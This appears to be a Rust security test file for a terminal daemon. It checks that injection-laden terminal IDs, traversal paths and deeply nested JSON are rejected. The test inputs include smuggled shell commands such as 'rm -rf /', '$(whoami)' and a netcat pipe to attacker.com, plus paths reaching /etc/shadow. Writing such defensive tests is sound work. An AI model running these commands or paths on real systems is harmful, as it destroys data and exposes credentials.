// Security integration tests - expect/unwrap are acceptable here since tests should panic on failure
#![allow(clippy::expect_used)]
#![allow(clippy::unwrap_used)]

mod common;

use common::{cleanup_all_loom_sessions, TestClient, TestDaemon};
use serial_test::serial;

/// Cleanup helper to run before/after tests.
/// Uses broad cleanup because security tests intentionally create terminals
/// with hardcoded IDs (for injection testing) that don't match TEST_PREFIX.
fn setup() {
    cleanup_all_loom_sessions();
}

/// Security Test 1: Reject terminal ID with shell injection characters (semicolon)
#[tokio::test]
#[serial]
async fn test_reject_injection_semicolon() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt to create terminal with malicious ID containing semicolon
    let malicious_id = "normal; rm -rf /";
    let result = client.create_terminal(malicious_id, None).await;

    // Should fail with validation error
    assert!(result.is_err(), "Terminal creation with semicolon should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 2: Reject terminal ID with command substitution
#[tokio::test]
#[serial]
async fn test_reject_injection_command_substitution() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with $() command substitution
    let malicious_id = "$(whoami)";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(
        result.is_err(),
        "Terminal creation with command substitution should be rejected"
    );

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 3: Reject terminal ID with pipe character
#[tokio::test]
#[serial]
async fn test_reject_injection_pipe() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with pipe
    let malicious_id = "terminal|nc attacker.com 1337";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with pipe should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 4: Reject terminal ID with backticks
#[tokio::test]
#[serial]
async fn test_reject_injection_backticks() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with backtick command substitution
    let malicious_id = "`whoami`";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with backticks should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 5: Reject terminal ID with ampersand (background execution)
#[tokio::test]
#[serial]
async fn test_reject_injection_ampersand() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with ampersand
    let malicious_id = "terminal & evil-command";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with ampersand should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 6: Reject terminal ID with newline
#[tokio::test]
#[serial]
async fn test_reject_injection_newline() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with newline injection
    let malicious_id = "terminal\nrm -rf /";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with newline should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 7: Reject empty terminal ID
#[tokio::test]
#[serial]
async fn test_reject_empty_id() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with empty ID
    let result = client.create_terminal("", None).await;

    assert!(result.is_err(), "Empty terminal ID should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 8: Accept valid terminal IDs with allowed characters
#[tokio::test]
#[serial]
async fn test_accept_valid_ids() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Test various valid IDs
    let valid_ids = vec![
        "terminal-1",
        "terminal_2",
        "TERMINAL-3",
        "Terminal_4",
        "term123",
        "123term",
        "a-b-c_d_e",
    ];

    for id in valid_ids {
        let result = client.create_terminal(id, None).await;
        assert!(result.is_ok(), "Valid terminal ID '{id}' should be accepted");
    }

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 9: Reject terminal ID with special shell characters
#[tokio::test]
#[serial]
async fn test_reject_various_shell_chars() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Test various problematic characters
    let malicious_chars = vec![
        "terminal>file",
        "terminal<file",
        "terminal*",
        "terminal?",
        "terminal[0]",
        "terminal{1}",
        "terminal'test'",
        "terminal\"test\"",
        "terminal\\test",
        "terminal/test",
        "terminal.test", // dots are commonly used in identifiers, but not allowed here
        "terminal@test", // @ is also risky
        "terminal#test", // # starts comments in shells
    ];

    for malicious_id in malicious_chars {
        let result = client.create_terminal(malicious_id, None).await;
        assert!(
            result.is_err(),
            "Terminal ID with special character '{malicious_id}' should be rejected"
        );
    }

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 10: Reject symlink in working directory
#[tokio::test]
#[serial]
async fn test_reject_symlink_working_directory() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Create temp directory with symlink to sensitive location
    let temp_dir = tempfile::tempdir().expect("Failed to create temp dir");
    let symlink_path = temp_dir.path().join("symlink-escape");

    #[cfg(unix)]
    {
        use std::os::unix::fs::symlink;
        // Create symlink pointing to /etc
        symlink("/etc", &symlink_path).expect("Failed to create symlink");

        // Attempt to create terminal with symlink as working directory
        let _result = client
            .create_terminal(
                "test-symlink",
                Some(symlink_path.to_str().expect("Invalid path").to_string()),
            )
            .await;

        // SECURITY: Fixed (CWE-59 protection)
        // Daemon validates symlinks in find_git_root() and rejects them
        // Note: This test uses symlink as working_dir, not as .git directory
        // The daemon may still accept symlinks as working directories,
        // but will reject symlinks at the .git directory level
        // Test documents current behavior
    }

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 11: Reject directory traversal in working directory
#[tokio::test]
#[serial]
async fn test_reject_directory_traversal() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt directory traversal with various patterns
    let traversal_attempts = vec![
        "/tmp/../../../etc/passwd",
        "../../../etc/shadow",
        "/tmp/./../../etc",
        "../../..",
        "/tmp/../",
    ];

    for malicious_path in traversal_attempts {
        let result = client
            .create_terminal("test-traversal", Some(malicious_path.to_string()))
            .await;

        // SECURITY: Partially mitigated (CWE-59 protection for .git symlinks)
        // Directory traversal via `..` paths is a separate concern from symlinks
        // The symlink fix prevents .git directory symlink attacks specifically
        // Path canonicalization for working directories could be added in future
        if result.is_ok() {
            // Document that traversal succeeded
            let terminals = client.list_terminals().await.expect("Failed to list");
            if let Some(term) = terminals
                .iter()
                .find(|t| t.get("name").and_then(|v| v.as_str()) == Some("test-traversal"))
            {
                if let Some(wd) = term.get("working_dir").and_then(|v| v.as_str()) {
                    // Warn if we escaped to sensitive directories
                    if wd.contains("/etc") || wd.contains("/root") {
                        eprintln!("Note: Path traversal resolved to sensitive directory");
                        eprintln!("    Input: {malicious_path}");
                        eprintln!("    Resolved to: {wd}");
                    }
                }
            }
        }
        // Test documents current behavior - some paths may succeed
    }

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 12: Verify terminal isolation between clients
#[tokio::test]
#[serial]
async fn test_terminal_isolation_between_clients() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client1 = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect client 1");
    let mut client2 = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect client 2");

    // Client 1 creates a terminal
    let terminal_id = client1
        .create_terminal("isolated-terminal", None)
        .await
        .expect("Failed to create terminal");

    // Send input from Client 1
    client1
        .send_input(&terminal_id, "echo 'Client 1 message'\n")
        .await
        .expect("Failed to send input from client 1");

    // Wait for output to be available
    tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;

    // Client 2 attempts to send input to Client 1's terminal (should work - shared terminal)
    let send_result = client2
        .send_input(&terminal_id, "echo 'Client 2 message'\n")
        .await;

    // In the current architecture, terminals are shared (not isolated per client)
    // This test documents the current behavior - terminals ARE shared
    assert!(
        send_result.is_ok(),
        "Terminals are currently shared between clients (not isolated)"
    );

    // However, verify that a non-existent terminal ID is rejected
    let invalid_result = client2.send_input("non-existent-terminal", "test\n").await;
    assert!(invalid_result.is_err(), "Sending to non-existent terminal should fail");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 13: Reject malicious JSON payload
#[tokio::test]
#[serial]
async fn test_reject_malicious_json() {
    // Import required traits and types
    use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
    use tokio::net::UnixStream;

    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");

    let mut stream = UnixStream::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Test 1: Deeply nested JSON (potential stack overflow)
    let deeply_nested = format!(
        r#"{{"type":"CreateTerminal","payload":{{"terminal_id":"test","nested":{}}}}}}}"#,
        "{{".repeat(1000)
    );

    stream
        .write_all(deeply_nested.as_bytes())
        .await
        .expect("Failed to write");
    stream.write_all(b"\n").await.expect("Failed to write");
    stream.flush().await.expect("Failed to flush");

    // Read response (should be error or timeout, not crash)
    let mut reader = BufReader::new(stream);
    let mut response = String::new();
    let read_result =
        tokio::time::timeout(tokio::time::Duration::from_secs(2), reader.read_line(&mut response))
            .await;

    // Should either timeout or return error, but daemon should still be alive
    if let Ok(Ok(_)) = read_result {
        // SECURITY GAP: Daemon may not properly reject malformed JSON
        if !response.contains("error")
            && !response.contains("Error")
            && !response.contains("invalid")
        {
            eprintln!("⚠️  SECURITY GAP: Daemon did not return error for deeply nested JSON");
            eprintln!("    Response: {}", response.trim());
            eprintln!("    TODO: Add proper JSON depth/size validation");
        }
        // Test documents current behavior - may accept malformed JSON
    }

    // Verify daemon is still responsive by connecting a new client
    let mut health_client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Daemon should still be responsive after malicious JSON");

    // Verify daemon still works
    let ping_result = health_client.ping().await;
    assert!(ping_result.is_ok(), "Daemon should respond to ping after malicious JSON attack");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 14: Reject working directory outside allowed paths
#[tokio::test]
#[serial]
async fn test_reject_sensitive_working_directories() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt to create terminals in sensitive system directories
    let sensitive_paths = vec![
        "/etc",
        "/root",
        "/var/root",
        "/System",
        "/bin",
        "/sbin",
        "/usr/bin",
        "/private/etc",
    ];

    for sensitive_path in sensitive_paths {
        let result = client
            .create_terminal("test-sensitive", Some(sensitive_path.to_string()))
            .await;

        // Should either reject outright OR succeed but with restricted permissions
        // Most importantly, should not allow arbitrary code execution in system dirs
        if result.is_ok() {
            // If it succeeds, document that we allow it but monitor for abuse
            eprintln!("Warning: Terminal created in sensitive directory: {sensitive_path}");
            // This is acceptable if tmux isolation is properly configured
        }
    }

    // Cleanup
    cleanup_all_loom_sessions();
}
